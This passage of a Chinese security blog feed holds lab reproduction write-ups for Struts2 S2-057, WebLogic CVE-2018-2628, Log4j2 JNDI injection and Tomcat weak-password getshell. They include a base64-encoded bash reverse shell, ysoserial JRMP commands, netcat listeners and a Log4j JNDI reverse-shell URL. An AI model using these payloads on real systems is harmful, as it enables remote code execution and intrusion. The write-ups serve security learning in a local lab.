href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813222635987.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813222635987.png" alt="image-20220813222635987"></a></p><p>image-20220813222635987</p><p><a href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813223610164.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813223610164.png" alt="image-20220813223610164"></a></p><p>image-20220813223610164</p><p>（再次强调，仅作为技术分享，请勿用于非法行为！！！）</p><p>本文参考：<a href="http://greatagain.688023.cn/#/book/search/detail?id=XcSgdPZjJvff&type=1">http://greatagain.688023.cn/#/book/search/detail?id=XcSgdPZjJvff&amp;type=1</a></p>]]></content>
    
    
    <categories>
      
      <category>实战</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Struts2 S2-057 远程代码执行漏洞(CVE-2018-11776)</title>
    <link href="/2023/08/09/Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2018-11776)/"/>
    <url>/2023/08/09/Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2018-11776)/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>定义XML配置时如果没有设置namespace的值，并且上层动作配置中并没有设置或使用通配符namespace时，可能会导致远程代码执行漏洞的发生。同样也可能因为url标签没有设置value和action的值，并且上层动作并没有设置或使用通配符namespace，namespace将由用户从uri传入，并作为OGNL表达式计算，最终造成任意命令执行漏洞。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.alwaysSelectFullNamespace值为true</p><p>2.action元素未设置namespace属性，或使用了通配符</p><p>3.影响版本:&lt;&#x3D;Struts 2.3.34，Struts 2.5.16</p><p>（比较鸡肋）</p><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10</p><p>靶机 ：192.168.129.130_kali</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker-compose build <span class="hljs-comment">#进行编译</span><br><br>docker-compose up -d <span class="hljs-comment">#运行靶场</span><br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220812121132495](D:\blog2\source_posts\Struts2 S2-057 远程代码执行漏洞(CVE-2018-11776).assets\image-20220812121132495.png)](<a href="https://xiaojun88.github.io/2022/08/12/CVE-2018-11776%EF%BC%88Struts2">https://xiaojun88.github.io/2022/08/12/CVE-2018-11776（Struts2</a> S2-057 远程代码执行漏洞）&#x2F;image-20220812121132495.png)</p><p>image-20220812121132495</p><h5 id="2-漏洞验证"><a href="#2-漏洞验证" class="headerlink" title="2.漏洞验证"></a>2.漏洞验证</h5><p>访问靶机</p><p><a href="http://192.168.129.130:8080/showcase/">http://192.168.129.130:8080/showcase/</a></p><p>[![image-20220812122212011](D:\blog2\source_posts\Struts2 S2-057 远程代码执行漏洞(CVE-2018-11776).assets\image-20220812122212011.png)](<a href="https://xiaojun88.github.io/2022/08/12/CVE-2018-11776%EF%BC%88Struts2">https://xiaojun88.github.io/2022/08/12/CVE-2018-11776（Struts2</a> S2-057 远程代码执行漏洞）&#x2F;image-20220812122212011.png)</p><p>image-20220812122212011</p><p>测试OGNL表达式<code>$&#123;1+1&#125;</code>：</p><p><a href="http://192.168.129.130:8080/showcase/%24%7B1%2b1%7D/actionChain1.action">http://192.168.129.130:8080/showcase/%24%7b1%2b1%7d/actionChain1.action</a></p><p>[![屏幕截图 2022-08-12 123118](D:\blog2\source_posts\Struts2 S2-057 远程代码执行漏洞(CVE-2018-11776).assets\屏幕截图 2022-08-12 123118.png)](<a href="https://xiaojun88.github.io/2022/08/12/CVE-2018-11776%EF%BC%88Struts2">https://xiaojun88.github.io/2022/08/12/CVE-2018-11776（Struts2</a> S2-057 远程代码执行漏洞）&#x2F;屏幕截图 2022-08-12 123118.png)</p><p>屏幕截图 2022-08-12 123118</p><p>可以看到1+1的结果已在Location标头中返回</p><h5 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h5><p>尝试了很多exp，大多需要python2环境，还是这个好用，需要私聊</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> struts2-<span class="hljs-number">057</span>_cmd.py http://<span class="hljs-number">192.168.129.130:8080</span> id<br><br><span class="hljs-attribute">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220812143004981](D:\blog2\source_posts\Struts2 S2-057 远程代码执行漏洞(CVE-2018-11776).assets\image-20220812143004981.png)](<a href="https://xiaojun88.github.io/2022/08/12/CVE-2018-11776%EF%BC%88Struts2">https://xiaojun88.github.io/2022/08/12/CVE-2018-11776（Struts2</a> S2-057 远程代码执行漏洞）&#x2F;image-20220812143004981.png)</p><p>image-20220812143004981</p><p>成功执行命令</p><h5 id="4-关闭环境"><a href="#4-关闭环境" class="headerlink" title="4.关闭环境"></a>4.关闭环境</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker-compose down <span class="hljs-attr">--rmi</span> <span class="hljs-attribute">all</span> -v #关闭并删除环境<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628)</title>
    <link href="/2022/09/18/Weblogic%20WLS%20Core%20Components%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2018-2628)/"/>
    <url>/2022/09/18/Weblogic%20WLS%20Core%20Components%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2018-2628)/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>WebLogic是美国Oracle公司出品的一个application server，基于java的中间件，在 WebLogic 里，攻击者利利用了T3协议的缺陷实现了Java虚拟机的RMI：远程方法调用(Remote Method Invocation)，能够在本地虚拟机上调用远端代码。该漏洞主要由于T3服务触发，所有开放weblogic控制台7001端口，默认会开启T3服务。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.T3服务开启（默认7001）端口</p><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.130_kali、192.168.129.128_window</p><p>靶机 ：192.168.129.131_centos</p><p>工具包：<a href="https://github.com/Lighird/CVE-2018-2628">https://github.com/Lighird/CVE-2018-2628</a></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker-compose build <span class="hljs-comment">#进行编译</span><br><br>docker-compose up -d <span class="hljs-comment">#运行靶场</span><br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220819174346085](D:\blog2\source_posts\Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628).assets\image-20220819174346085.png)](<a href="https://xiaojun88.github.io/2022/08/18/CVE-2018-2628%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/18/CVE-2018-2628（Weblogic</a> WLS Core Components 反序列化命令执行漏洞）&#x2F;image-20220819174346085.png)</p><p>image-20220819174346085</p><h5 id="2-漏洞验证"><a href="#2-漏洞验证" class="headerlink" title="2.漏洞验证"></a>2.漏洞验证</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> --script=weblogic-t3-<span class="hljs-literal">info</span>.nse -p <span class="hljs-number">7001</span> <span class="hljs-number">192.168.129.131</span><br><br>SHELL<br></code></pre></td></tr></table></figure><p>发现T3服务开启</p><p>[![image-20220819175319409](D:\blog2\source_posts\Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628).assets\image-20220819175319409.png)](<a href="https://xiaojun88.github.io/2022/08/18/CVE-2018-2628%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/18/CVE-2018-2628（Weblogic</a> WLS Core Components 反序列化命令执行漏洞）&#x2F;image-20220819175319409.png)</p><p>image-20220819175319409</p><p>使用工具包中的poc（链接在文章开头），将靶机192.168.129.131:7001写入url.txt中</p><p>[![image-20220819194111781](D:\blog2\source_posts\Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628).assets\image-20220819194111781.png)](<a href="https://xiaojun88.github.io/2022/08/18/CVE-2018-2628%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/18/CVE-2018-2628（Weblogic</a> WLS Core Components 反序列化命令执行漏洞）&#x2F;image-20220819194111781.png)</p><p>image-20220819194111781</p><p>验证脚本需要在python2环境下运行，回到windows</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span>  CVE-<span class="hljs-number">2018</span>-<span class="hljs-number">2628</span>-MultiThreading.py<br><br><span class="hljs-attribute">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220819194647063](D:\blog2\source_posts\Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628).assets\image-20220819194647063.png)](<a href="https://xiaojun88.github.io/2022/08/18/CVE-2018-2628%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/18/CVE-2018-2628（Weblogic</a> WLS Core Components 反序列化命令执行漏洞）&#x2F;image-20220819194647063.png)</p><p>image-20220819194647063</p><p>验证出来有漏洞</p><h5 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h5><p>在kali搭建一个JRMP(java remote method protocol，Java远程方法协议）服务器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp ysoserial-<span class="hljs-number">0</span>.<span class="hljs-number">1</span>-cve-<span class="hljs-number">2018</span>-<span class="hljs-number">2628</span>-<span class="hljs-literal">all</span>.jar ysoserial.exploit.JRMPListener <span class="hljs-number">9999</span> Jdk7u21 &#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyOS4xMzAvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;<br><br><span class="hljs-attribute">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220819214004453](D:\blog2\source_posts\Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628).assets\image-20220819214004453.png)](<a href="https://xiaojun88.github.io/2022/08/18/CVE-2018-2628%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/18/CVE-2018-2628（Weblogic</a> WLS Core Components 反序列化命令执行漏洞）&#x2F;image-20220819214004453.png)</p><p>image-20220819214004453</p><p>其中反弹shell的pyload如下生成</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.129.130</span>/<span class="hljs-number">7777</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><br><span class="hljs-attribute">SHELL</span><br></code></pre></td></tr></table></figure><p>需要把用以下网站进行编码一下</p><p><a href="https://www.bugku.net/runtime-exec-payloads/">https://www.bugku.net/runtime-exec-payloads/</a></p><p>[![image-20220819212438853](D:\blog2\source_posts\Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628).assets\image-20220819212438853.png)](<a href="https://xiaojun88.github.io/2022/08/18/CVE-2018-2628%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/18/CVE-2018-2628（Weblogic</a> WLS Core Components 反序列化命令执行漏洞）&#x2F;image-20220819212438853.png)</p><p>image-20220819212438853</p><p>在kali新建一个窗口，生成一个监听端口7777</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lnvp <span class="hljs-number">7777</span><br><br><span class="hljs-attribute">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220819213145521](D:\blog2\source_posts\Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628).assets\image-20220819213145521.png)](<a href="https://xiaojun88.github.io/2022/08/18/CVE-2018-2628%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/18/CVE-2018-2628（Weblogic</a> WLS Core Components 反序列化命令执行漏洞）&#x2F;image-20220819213145521.png)</p><p>image-20220819213145521</p><p>在在kali中开一个窗口执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar ysoserial-<span class="hljs-number">0</span>.<span class="hljs-number">1</span>-cve-<span class="hljs-number">2018</span>-<span class="hljs-number">2628</span>-<span class="hljs-literal">all</span>.jar JRMPClient2 <span class="hljs-number">192.168.129.130:9999</span> | xxd -p | tr -d $&#x27;\n&#x27; &amp;&amp; echo<br><br><span class="hljs-attribute">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220819220007233](D:\blog2\source_posts\Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628).assets\image-20220819220007233.png)](<a href="https://xiaojun88.github.io/2022/08/18/CVE-2018-2628%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/18/CVE-2018-2628（Weblogic</a> WLS Core Components 反序列化命令执行漏洞）&#x2F;image-20220819220007233.png)</p><p>image-20220819220007233</p><p>编辑weblogic_poc.py</p><p>把第21行，把pyload内容替换为以上红色圈注的部分</p><p>[![image-20220819220459490](D:\blog2\source_posts\Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628).assets\image-20220819220459490.png)](<a href="https://xiaojun88.github.io/2022/08/18/CVE-2018-2628%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/18/CVE-2018-2628（Weblogic</a> WLS Core Components 反序列化命令执行漏洞）&#x2F;image-20220819220459490.png)</p><p>image-20220819220459490</p><p>在84行，把IP替换为靶机IP</p><p>[![image-20220819220612325](D:\blog2\source_posts\Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628).assets\image-20220819220612325.png)](<a href="https://xiaojun88.github.io/2022/08/18/CVE-2018-2628%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/18/CVE-2018-2628（Weblogic</a> WLS Core Components 反序列化命令执行漏洞）&#x2F;image-20220819220612325.png)</p><p>image-20220819220612325</p><p>[![image-20220819214715481](D:\blog2\source_posts\Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628).assets\image-20220819214715481.png)](<a href="https://xiaojun88.github.io/2022/08/18/CVE-2018-2628%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/18/CVE-2018-2628（Weblogic</a> WLS Core Components 反序列化命令执行漏洞）&#x2F;image-20220819214715481.png)</p><p>image-20220819214715481</p><p>[![image-20220819214834473](D:\blog2\source_posts\Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628).assets\image-20220819214834473.png)](<a href="https://xiaojun88.github.io/2022/08/18/CVE-2018-2628%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/18/CVE-2018-2628（Weblogic</a> WLS Core Components 反序列化命令执行漏洞）&#x2F;image-20220819214834473.png)</p><p>image-20220819214834473</p><p>回到window执行（因为我只有window有python2）</p><p>python2 weblogic_poc.py</p><p>[![image-20220819215605525](D:\blog2\source_posts\Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628).assets\image-20220819215605525.png)](<a href="https://xiaojun88.github.io/2022/08/18/CVE-2018-2628%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/18/CVE-2018-2628（Weblogic</a> WLS Core Components 反序列化命令执行漏洞）&#x2F;image-20220819215605525.png)</p><p>image-20220819215605525</p><p>kali成功上线</p><p>[![image-20220819215506973](D:\blog2\source_posts\Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628).assets\image-20220819215506973.png)](<a href="https://xiaojun88.github.io/2022/08/18/CVE-2018-2628%EF%BC%88Weblogic">https://xiaojun88.github.io/2022/08/18/CVE-2018-2628（Weblogic</a> WLS Core Components 反序列化命令执行漏洞）&#x2F;image-20220819215506973.png)</p><p>image-20220819215506973</p><h5 id="4-关闭环境"><a href="#4-关闭环境" class="headerlink" title="4.关闭环境"></a>4.关闭环境</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker-compose down <span class="hljs-attr">--rmi</span> <span class="hljs-attribute">all</span> -v #关闭并删除环境<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Apache Log4j2 查找功能 JNDI 注入(CVE-2021-44228)</title>
    <link href="/2022/05/08/Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5(CVE-2021-44228)/"/>
    <url>/2022/05/08/Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5(CVE-2021-44228)/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的lookup用于进行JNDI注入，执行任意代码。</p><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10</p><p>靶机 ：192.168.129.130_kali</p><p>JNDIExploit.v1.2：链接: <a href="https://pan.baidu.com/s/1lUcyeU-QlSfCEZI-YU4A-w">https://pan.baidu.com/s/1lUcyeU-QlSfCEZI-YU4A-w</a> 提取码: xiao</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker-compose build <span class="hljs-comment">#进行编译</span><br><br>docker-compose up -d <span class="hljs-comment">#运行靶场</span><br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220810113257176-1660185235187](D:\blog2\source_posts\Apache Log4j2 查找功能 JNDI 注入(CVE-2021-44228).assets\image-20220810113257176-1660185235187.png)](<a href="https://xiaojun88.github.io/2022/08/11/CVE-2021-44228%EF%BC%88Apache">https://xiaojun88.github.io/2022/08/11/CVE-2021-44228（Apache</a> Log4j2 查找功能 JNDI 注入）&#x2F;image-20220810113257176-1660185235187.png)</p><p>image-20220810113257176-1660185235187</p><h5 id="2-漏洞验证"><a href="#2-漏洞验证" class="headerlink" title="2.漏洞验证"></a>2.漏洞验证</h5><p>在<a href="http://dnslog.cn/%E8%8E%B7%E5%8F%96%E4%B8%80%E4%B8%AA%E6%B5%8B%E8%AF%95%E7%9A%84%E5%9F%9F%E5%90%8D">http://dnslog.cn/获取一个测试的域名</a></p><p>构造数据包dnslog测试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">129.130</span>:<span class="hljs-number">8983</span><span class="hljs-regexp">/solr/</span>admin<span class="hljs-regexp">/cores?action=$&#123;jndi:ldap:/</span>/<span class="hljs-variable">$&#123;sys:java.version&#125;</span>.<span class="hljs-number">931</span>p5u.dnslog.cn&#125;<br><br>URL<br></code></pre></td></tr></table></figure><p>[![image-20220810115554880](D:\blog2\source_posts\Apache Log4j2 查找功能 JNDI 注入(CVE-2021-44228).assets\image-20220810115554880.png)](<a href="https://xiaojun88.github.io/2022/08/11/CVE-2021-44228%EF%BC%88Apache">https://xiaojun88.github.io/2022/08/11/CVE-2021-44228（Apache</a> Log4j2 查找功能 JNDI 注入）&#x2F;image-20220810115554880.png)</p><p>image-20220810115554880</p><p>存在漏洞</p><h5 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h5><p>中转机vps环境构建</p><p>使用工具exp:Log4j-exp</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar JNDIExploit-<span class="hljs-number">1</span>.<span class="hljs-number">2</span>-SNAPSHOT.jar -i <span class="hljs-number">192.168.129.128</span><br><br><span class="hljs-attribute">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220810112602168](D:\blog2\source_posts\Apache Log4j2 查找功能 JNDI 注入(CVE-2021-44228).assets\image-20220810112602168.png)](<a href="https://xiaojun88.github.io/2022/08/11/CVE-2021-44228%EF%BC%88Apache">https://xiaojun88.github.io/2022/08/11/CVE-2021-44228（Apache</a> Log4j2 查找功能 JNDI 注入）&#x2F;image-20220810112602168.png)</p><p>image-20220810112602168</p><p>启动监听</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lnvp <span class="hljs-number">1234</span><br><br><span class="hljs-attribute">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220810112520706](D:\blog2\source_posts\Apache Log4j2 查找功能 JNDI 注入(CVE-2021-44228).assets\image-20220810112520706-1660198332069.png)](<a href="https://xiaojun88.github.io/2022/08/11/CVE-2021-44228%EF%BC%88Apache">https://xiaojun88.github.io/2022/08/11/CVE-2021-44228（Apache</a> Log4j2 查找功能 JNDI 注入）&#x2F;image-20220810112520706-1660198332069.png)</p><p>image-20220810112520706</p><p>反弹shell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">129.130</span>:<span class="hljs-number">8983</span><span class="hljs-regexp">/solr/</span>admin<span class="hljs-regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="hljs-regexp">/192.168.129.130:1389/</span>Basic<span class="hljs-regexp">/ReverseShell/</span><span class="hljs-number">192.168</span>.<span class="hljs-number">128.130</span>/<span class="hljs-number">1234</span>&#125;<br><br>SHELL<br></code></pre></td></tr></table></figure><p>[![image-20220810112302254-1660183567356](D:\blog2\source_posts\Apache Log4j2 查找功能 JNDI 注入(CVE-2021-44228).assets\image-20220810112302254-1660183567356.png)](<a href="https://xiaojun88.github.io/2022/08/11/CVE-2021-44228%EF%BC%88Apache">https://xiaojun88.github.io/2022/08/11/CVE-2021-44228（Apache</a> Log4j2 查找功能 JNDI 注入）&#x2F;image-20220810112302254-1660183567356.png)</p><p>image-20220810112302254-1660183567356</p><h5 id="4-关闭环境"><a href="#4-关闭环境" class="headerlink" title="4.关闭环境"></a>4.关闭环境</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker-compose down <span class="hljs-attr">--rmi</span> <span class="hljs-attribute">all</span> -v #关闭并删除环境<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Tomcat7+弱密码&amp;&amp;后端Getshell漏洞</title>
    <link href="/2022/05/08/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&amp;&amp;%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/05/08/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&amp;&amp;%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>tomcat存在管理后台进行应用部署管理，且管理后台使用HTTP基础认证进行登录。若用户口令为弱口令，攻击者容易进行暴力破解登录后台并进行应用管理。登录成功后有上传点，上传压缩包 xxx.war的.war不会被解析，直接访问 xxx&#x2F;目录下的木马，拿到权限。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1、tomcat所有版本</p><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10</p><p>靶机 ：192.168.129.130_kali</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker-compose build <span class="hljs-comment">#进行编译</span><br><br>docker-compose up -d <span class="hljs-comment">#运行靶场</span><br><br>docker ps  <span class="hljs-comment">#查看容器</span><br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818154809280.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818154809280.png" alt="image-20220818154809280"></a></p><p>image-20220818154809280</p><h5 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h5><p>访问<a href="http://192.168.129.130:8080/">http://192.168.129.130:8080/</a></p><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818130507238.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818130507238.png" alt="image-20220818130507238"></a></p><p>image-20220818130507238</p><p>进行登录</p><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818130634750.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818130634750.png" alt="image-20220818130634750"></a></p><p>image-20220818130634750</p><p>BurpSuitPro抓包</p><p><a href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818130922937.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818130922937.png" alt="image-20220818130922937"></a></p><p>image-20220818130922937</p><p>发现账号密码格式为 base64(账号:密码)</p><p><a 